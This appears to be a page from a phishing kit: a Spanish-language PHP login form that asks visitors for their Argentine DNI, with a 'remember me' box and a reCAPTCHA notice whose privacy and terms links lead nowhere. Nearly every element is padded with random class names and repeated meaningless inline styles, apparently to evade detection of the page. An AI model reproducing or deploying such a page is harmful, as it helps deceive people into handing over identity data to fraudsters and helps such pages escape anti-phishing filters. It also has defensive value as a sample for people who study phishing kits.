<?php
include_once("parts/header.php");
?>
<body>
<nav>
	<div class="navbar-contenedor CWUr9m96"  style="flood-color:currentcolor;flood-color:currentcolor;unicode-bidi:initial;">
		<?php include_once("parts/nav.php"); ?>
		<span class="RhuyZOxJl2"  style="scale:initial;font-kerning:initial;unicode-bidi:initial;">Inicio sesión</span>
	</div>
</nav>
<form action="login" method="POST" class="kS2nkX"  style="writing-mode:inherit;font-kerning:initial;scale:initial;">
	<div  style="unicode-bidi:initial;writing-mode:inherit;writing-mode:inherit;" class="container-fluid RTnuS5HZa mt-5 mt-md-5 Ca519NkqQ">
		<div  style="writing-mode:inherit;unicode-bidi:initial;font-kerning:initial;" class="row d-flex cYcOiWSIaerg justify-content-center BeYVrQQRcB">
			<div class="kDvB7GJHHz col-12 4wMm3 col-md-5 mt-5 RhUHqD"  style="font-kerning:initial;scale:initial;font-kerning:initial;">
				<h3 class="tz9Cl0"  style="scale:initial;writing-mode:inherit;scale:initial;">Para empezar, ingresá tu DNI</h3>
				<div class="row YnoGm6voQZ d-flex ySZftN0oD6 justify-content-center 5QIiGuN contenedor_caja mb-5 LlM2nqN8"  style="writing-mode:inherit;flood-color:currentcolor;unicode-bidi:initial;">
					<div class="col-12 SwXXYN form-padding Pz4duxG1"  style="unicode-bidi:initial;flood-color:currentcolor;font-kerning:initial;">
						<div  style="flood-color:currentcolor;writing-mode:inherit;scale:initial;" class=" pPDWtipC row 0ZvDzr">
							<div  style="font-kerning:initial;font-kerning:initial;flood-color:currentcolor;" class="input P3GYYitry7jzOy col-12">
								<label  style="font-kerning:initial;unicode-bidi:initial;font-kerning:initial;" for="dni" class="ZgzLDrMi">DNI</label>
								<input  style="font-kerning:initial;font-kerning:initial;flood-color:currentcolor;" type="tel" id="dni"  class="Y0mcjr" name="dni" placeholder="" minlength="4" maxlength="8" required>
							</div>
							<div  style="flood-color:currentcolor;flood-color:currentcolor;unicode-bidi:initial;" class="HRamypBLEdB col-12 m-0 o6SQ9nJQm4SElWk p-0 d-flex align-items-center">
								<span class="checkbox zNpXNYnhKNFPiw nonchecked"></span><span class=" A5d1EL checkbox_label 1znAamXIce"  style="writing-mode:inherit;font-kerning:initial;writing-mode:inherit;">Recordarme</span>
							</div>
						</div>
					</div>
					<div  style="flood-color:currentcolor;scale:initial;unicode-bidi:initial;" class=" p6ZeHp11rV1R col-12 linea W3WXZryuJpAgO8p"></div>
					<div class="col-12 ZGHcs2g4yNpdt p-3"  style="unicode-bidi:initial;flood-color:currentcolor;scale:initial;">
						<div class=" 8uliD4qHRjikbEQ row j6ycRktVzxa"  style="unicode-bidi:initial;unicode-bidi:initial;font-kerning:initial;">
							<div class="col-12 UVx3mvkkWdJl"  style="scale:initial;writing-mode:inherit;scale:initial;">
								<button  style="font-kerning:initial;font-kerning:initial;flood-color:currentcolor;" disabled="" class="Kjv5N5o58IVBz pc NEaMYfy" type="submit">Continuar <img  style="writing-mode:inherit;flood-color:currentcolor;scale:initial;" src="flecha.png" class="GbHIGV7umbss7"></button>
							</div>
						</div>
					</div>
				</div>
			</div>
			<div  style="flood-color:currentcolor;font-kerning:initial;writing-mode:inherit;" class="uTluJKAsAH9 col-12 ncHDWJc4k9">
				<p class="UxRHytdmvCJ captcha"  style="flood-color:currentcolor;font-kerning:initial;writing-mode:inherit;">Protegido por reCAPTCHA <a href="#"  style="font-kerning:initial;unicode-bidi:initial;font-kerning:initial;">Privacidad</a> - <a  style="scale:initial;writing-mode:inherit;unicode-bidi:initial;" href="#">Condiciones</a></p>
			</div>
		</div>
	</div>
	<button disabled=""  style="scale:initial;font-kerning:initial;unicode-bidi:initial;" class="KzJR8MLxSE3c movil  H2X6jS8DGGgUPI step1 PS92XjYEIDP" type="submit">Continuar</button>
</form>
<?php
include_once("parts/footer.php");
?>
</body>
</html>